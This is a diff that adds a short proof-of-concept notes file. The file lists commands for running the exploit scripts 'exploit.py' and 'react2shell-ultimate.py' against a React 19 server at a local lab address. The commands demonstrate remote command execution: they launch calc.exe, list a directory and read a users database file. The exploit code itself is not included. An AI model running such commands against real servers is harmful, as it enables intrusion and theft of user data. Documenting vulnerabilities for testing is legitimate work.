@@ -1,0 +1,13 @@
+Crafted Commands for POC
+All commands are ran on 10.0.0.16 to emphasize how any external react19 server can be accessed not only by "localhost"
+
+Simple exploit script to show the delivery of a modified payload and the hijacking of server terminal:
+
+python exploit.py -t http://10.0.0.16:3000 -c "calc.exe"
+
+Using React2shell-ultimate to show how parsing commands through the react2shell payload
+can create dangerous and destructive functions:
+
+python react2shell-ultimate.py -u http://10.0.0.16:3000 --god --windows --cmd "dir"
+
+python react2shell-ultimate.py -u http://10.0.0.16:3000 --god --windows --cmd "type data/users.db"
